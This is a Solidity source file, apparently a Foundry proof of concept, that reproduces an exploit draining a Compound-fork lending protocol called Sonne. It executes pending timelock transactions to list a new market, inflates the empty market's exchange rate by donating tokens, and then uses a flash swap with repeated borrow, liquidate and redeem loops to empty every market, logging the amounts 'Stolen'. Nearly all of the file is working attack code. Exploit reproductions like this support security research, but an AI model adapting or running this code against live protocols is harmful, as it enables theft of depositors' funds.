// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";
import "./interfaces/IPool.sol";
import "./interfaces/IVelo.sol";
import "./interfaces/IUniversalRouter.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/governance/TimelockController.sol";
import {CErc20} from "lending-protocol/CErc20.sol";
import {CToken} from "lending-protocol/CToken.sol";
import {Comptroller} from "lending-protocol/Comptroller.sol";
import {Comp} from "lending-protocol/Governance/Comp.sol";
import {PriceOracle} from "lending-protocol/PriceOracle.sol";
import {ExponentialNoError} from "./ExponentialNoError.sol";


contract PrepareHack {
    constructor(address soVelo, address unitroller, address payable timeLock, address veloToken, address uniRouter) payable {
        TimelockController(timeLock).execute(
            soVelo,
            0,
            abi.encodeWithSelector(CToken._setReserveFactor.selector, 0.3 ether),
            bytes32(0x0),
            bytes32(0x476d385370ae53ff1c1003ab3ce694f2c75ebe40422b0ba11def4846668bc84c)
        );
        TimelockController(timeLock).execute(
            soVelo,
            0,
            abi.encodeWithSelector(CToken._setInterestRateModel.selector, address(0x7320bD5fA56F8a7Ea959a425F0C0b8cAc56F741E)),
            bytes32(0x0),
            bytes32(0xa57973a3d5a5d99d454c54117d7d30a57a8aca089891f505f120174216edaf42)
        );
        TimelockController(timeLock).execute(
            unitroller,
            0,
            abi.encodeWithSelector(Comptroller._setPriceOracle.selector, address(0x22C7e5Ce392BC951f63B68a8020B121A8E1C0Fea)),
            bytes32(0x0),
            bytes32(0x42408274449fd7829d7fb6abe2e89a618a853acf68d1553b2f6b8b671ac443fd)
        );
        TimelockController(timeLock).execute(
            unitroller,
            0,
            abi.encodeWithSelector(Comptroller._supportMarket.selector, address(soVelo)),
            bytes32(0x0),
            bytes32(0xb02c80e66eae74aef841e5d998aef03d201de66590950b6353e9a28b289c8c8b)
        );
        
        bytes memory path = abi.encodePacked(
            address(0x4200000000000000000000000000000000000006), // weth
            uint24(3000),
            address(veloToken)
        );

        bytes memory commands = abi.encodePacked(uint32(0x0b000604));
        bytes[] memory inputs = new bytes[](4);
        inputs[0] = abi.encode(address(2), msg.value); // wrap eth
        inputs[1] = abi.encode(address(2), msg.value, uint256(2540262944979767002513),  path, bool(false)); // swap
        inputs[2] = abi.encode(address(veloToken), address(0x3d83ec320541aE96C4C91E9202643870458fB290), uint256(25)); // pay fee
        inputs[3] = abi.encode(address(veloToken), address(1), uint256(2540262944979767002513)); // sweep
        IUniversalRouter(uniRouter).execute{value: msg.value}(
            commands,
            inputs,
            block.timestamp * 2
        );

        IVelo(veloToken).approve(soVelo, type(uint256).max);
        CErc20(soVelo).mint(400000001);
        IVelo(veloToken).transfer(soVelo, uint256(2552964259704265837526)); // as in orig exploit
        CToken(soVelo).transfer(msg.sender, 2);
        selfdestruct(payable(msg.sender));
    }
}


contract SonneExploit {
    address owner;
    IPool public veloPool;
    IVelo public veloToken;
    Comptroller public unitroller;
    CToken public soVelo;
    Liquidator liquidator;


    constructor(address _veloPool, address _veloToken, address _unitroller, address _soVelo) {
        veloPool = IPool(_veloPool);
        veloToken = IVelo(_veloToken);
        unitroller = Comptroller(payable(_unitroller));
        soVelo = CToken(_soVelo);
        liquidator = new Liquidator();
        owner = msg.sender;
        //hack();
    }

    function hack() public {
        IERC20 underlying;
        Comp sonneToken = Comp(unitroller.getCompAddress());
        TimelockController timelock = TimelockController(payable(unitroller.admin()));
        timelock.execute(
            address(unitroller), 
            0, 
            abi.encodeWithSelector(Comptroller._setCollateralFactor.selector, address(soVelo), uint256(350000000000000000)),
            bytes32(0x0),
            bytes32(0xe50459992a5c9678d53efbffbf6b95687111e5789dada996e41fea2986077bed)
        );

        uint256 poolBalance = veloToken.balanceOf(address(veloPool));
        veloPool.swap(0, poolBalance - 100000 ether, address(this), "hack");

        CToken[] memory allMarkets = unitroller.getAllMarkets();
        for(uint i; i < allMarkets.length; i++) {
            underlying = IERC20(CErc20(address(allMarkets[i])).underlying());
            underlying.transfer(msg.sender, underlying.balanceOf(address(this)));
        }
    }

    function getSoVelo() public {
        soVelo.transfer(msg.sender, 2);
    }

    function hook(address callee, uint256 t0_out, uint256 t1_out, bytes calldata data) external {
        uint256 marketPrice = 0;
        uint256 marketCash = 0;
        IERC20 underlying;

        CToken[] memory allMarkets = unitroller.getAllMarkets();
        PriceOracle priceOracle = PriceOracle(unitroller.oracle());
        uint256 soVeloPrice = priceOracle.getUnderlyingPrice(soVelo);
        veloToken.approve(address(soVelo), type(uint256).max);
        veloToken.transfer(address(soVelo), t1_out);
        for(uint i; i < allMarkets.length; i++) {
            if (!unitroller.borrowGuardianPaused(address(allMarkets[i]))) {
                underlying = IERC20(CErc20(address(allMarkets[i])).underlying());
                marketPrice = priceOracle.getUnderlyingPrice(allMarkets[i]);
                if ((marketPrice * 108 * 10**16 * 10 ** 18) / (soVeloPrice * 10**38) == 0) {
                    continue;
                }
                if (marketPrice != 0) {
                    marketCash = allMarkets[i].getCash();
                    while (marketCash > (soVeloPrice * 10 ** 20 * 108 * 10) / (marketPrice * 100)) {
                        veloToken.transfer(address(soVelo), veloToken.balanceOf(address(this)));
                        borrowAndLiq(allMarkets[i], marketPrice, marketCash, soVeloPrice);
                        marketCash = allMarkets[i].getCash();
                    }
                }
            }
            console.log("[+] Stolen = ", underlying.balanceOf(address(this)) / uint256(10 ** ERC20(address(underlying)).decimals()), ERC20(address(underlying)).symbol());
        }
        veloToken.transfer(msg.sender, t1_out);
        (uint256 r0, uint256 r1, ) = veloPool.getReserves();
        if (IERC20(veloPool.token0()).balanceOf(address(this)) > 0) {
            IERC20(veloPool.token0()).transfer(address(veloPool), r0 * t1_out/100 / (r1 - t1_out/100) + 1000*10**6);
        }
    }

    function borrowAndLiq(CToken currMarket, uint256 marketPrice, uint256 marketCash, uint256 soVeloPrice) internal {
        IERC20 underlying = IERC20(CErc20(address(currMarket)).underlying());
        uint256 borrowAmount = currMarket.getCash();
        if (marketCash * marketPrice > veloToken.balanceOf(address(soVelo)) * soVeloPrice * 174 / 1000) {
            borrowAmount = veloToken.balanceOf(address(soVelo)) * soVeloPrice * 174 / 1000 / marketPrice;
        }
        address[] memory cTokens = new address[](2);
        cTokens[0] = address(currMarket);
        cTokens[1] = address(soVelo);

        Temp temp = new Temp(address(veloToken), address(unitroller), address(underlying), cTokens, borrowAmount, veloToken.balanceOf(address(soVelo)) - 10 ** 20);
        uint256 repayAmount = (uint256(199999999999999999999)*soVeloPrice * 10**38) / (108 * 10**16 * marketPrice * 10 ** 20); //(soVeloPrice * 10 ** 20 * 108) / (marketPrice * 100);
        IERC20(underlying).transfer(address(liquidator), repayAmount);
        liquidator.liquidate(cTokens, address(underlying), address(temp), repayAmount);
        CErc20(address(soVelo)).mint(veloToken.balanceOf(address(soVelo)) + 1);
    }
}

contract Temp {
    constructor(address veloToken, address unitroller, address underlying, address[] memory cTokens, uint256 borrowAmount, uint256 redeemAmount) {
        SonneExploit(msg.sender).getSoVelo();
        Comptroller(unitroller).enterMarkets(cTokens);
        CErc20(cTokens[0]).borrow(borrowAmount);
        CErc20(cTokens[1]).redeemUnderlying(redeemAmount);
        IVelo(veloToken).transfer(msg.sender, redeemAmount);
        IERC20(underlying).transfer(msg.sender, borrowAmount);
        selfdestruct(payable(msg.sender));
    }
}

contract Liquidator {
    function liquidate(address[] memory cTokens, address underlying, address borrower, uint256 repayAmount) public {
        IERC20(underlying).approve(cTokens[0], type(uint256).max);
        CErc20(cTokens[0]).liquidateBorrow(borrower, repayAmount, CToken(cTokens[1]));
        CErc20(cTokens[1]).transfer(msg.sender, 1);
    }
}
